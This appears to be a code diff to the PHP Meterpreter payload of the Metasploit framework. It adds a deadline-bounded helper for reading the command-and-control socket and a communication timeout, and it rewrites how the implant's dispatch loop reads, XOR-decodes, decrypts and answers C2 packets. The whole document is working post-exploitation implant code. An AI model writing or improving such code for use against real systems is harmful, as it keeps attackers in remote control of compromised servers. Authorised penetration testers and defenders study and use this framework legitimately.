@@ -1,0 +1,96 @@
+--- a/php/meterpreter/meterpreter.php
++++ b/php/meterpreter/meterpreter.php
+@@ -1586,10 +1586,46 @@
++# C2 framing needs an exact read: the channel read helper may return an empty
++# string while an open stream is waiting for the next part of a packet.
++# Keep its nonblocking channel contract unchanged and wait only on the C2 socket.
++function read_c2_bytes($resource, $length, $deadline) {
++  if ($length < 0) { return false; }
++  $buffer = '';
++  while (strlen($buffer) < $length) {
++    $remaining = $deadline - microtime(true);
++    if ($remaining <= 0) { return false; }
++    $wait = min(1, $remaining);
++    $seconds = (int)$wait;
++    $microseconds = ($seconds === 0) ? max(1, (int)($wait * 1000000)) : 0;
++    $readers = array($resource);
++    $writers = null; $errors = null;
++    $count = select($readers, $writers, $errors, $seconds, $microseconds);
++    if ($count === false) { return false; }
++    if ($count === 0) { continue; }
++
++    $needed = $length - strlen($buffer);
++    switch (get_rtype($resource)) {
++      case 'socket':
++        $chunk = socket_read($resource, $needed, PHP_BINARY_READ);
++        break;
++      case 'stream':
++        $chunk = fread($resource, $needed);
++        break;
++      default:
++        return false;
++    }
++    if ($chunk === false || $chunk === '') { return false; }
++    $buffer .= $chunk;
++  }
++  return $buffer;
++}
++
+ function dispatch_tcp(&$transport) {
++  $last_packet_time = microtime(true);
+   $msgsock = $transport['_socket'];
+   add_reader($msgsock);
+   $r = $GLOBALS['readers'];
+   $w = null; $e = null; $t = 1;
+   while (false !== ($cnt = select($r, $w, $e, $t))) {
+-    if (empty($GLOBALS['running']) || time() > $GLOBALS['session_expiry_end']) {
++    if (empty($GLOBALS['running']) || microtime(true) >= $GLOBALS['session_expiry_end']) {
+       remove_reader($msgsock); close($msgsock);
+       return DISPATCH_EXIT;
+     }
+@@ -1597,28 +1633,28 @@
+       remove_reader($msgsock); close($msgsock);
+       return DISPATCH_SWITCH;
+     }
++    if (microtime(true) >= $last_packet_time + $transport['comm_timeout']) {
++      remove_reader($msgsock); close($msgsock);
++      return DISPATCH_RETIRE;
++    }
+     for ($i = 0; $i < $cnt; $i++) {
+       $ready = $r[$i];
+       if ($ready == $msgsock) {
+-        $packet = read($msgsock, 32);
+-        if (false == $packet) {
++        $deadline = min($GLOBALS['session_expiry_end'], $last_packet_time + $transport['comm_timeout']);
++        $packet = read_c2_bytes($msgsock, 32, $deadline);
++        if ($packet !== false) {
++          $xor = substr($packet, 0, 4);
++          $header = xor_bytes($xor, substr($packet, 4, 28));
++          $len_array = unpack("Nlen", substr($header, 20, 4));
++          $len = $len_array['len'] + 32 - 8;
++          $body = read_c2_bytes($msgsock, $len - 32, $deadline);
++          $packet = ($body === false) ? false : $packet . $body;
++        }
++        if ($packet === false) {
+           remove_reader($msgsock); close($msgsock);
+-          return DISPATCH_RETIRE;
++          return (empty($GLOBALS['running']) || microtime(true) >= $GLOBALS['session_expiry_end']) ? DISPATCH_EXIT : DISPATCH_RETIRE;
+         }
+-        $xor = substr($packet, 0, 4);
+-        $header = xor_bytes($xor, substr($packet, 4, 28));
+-        $len_array = unpack("Nlen", substr($header, 20, 4));
+-        $len = $len_array['len'] + 32 - 8;
+-        while (strlen($packet) < $len) {
+-          $chunk = read($msgsock, $len - strlen($packet));
+-          if ($chunk === false || $chunk === '') {
+-            # The C2 socket closed mid-packet; the partial packet is
+-            # unprocessable so retire rather than attempt a corrupt response.
+-            remove_reader($msgsock); close($msgsock);
+-            return DISPATCH_RETIRE;
+-          }
+-          $packet .= $chunk;
+-        }
++        $last_packet_time = microtime(true);
+         $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
+         write_tlv_to_socket($msgsock, $response);
+       } else {
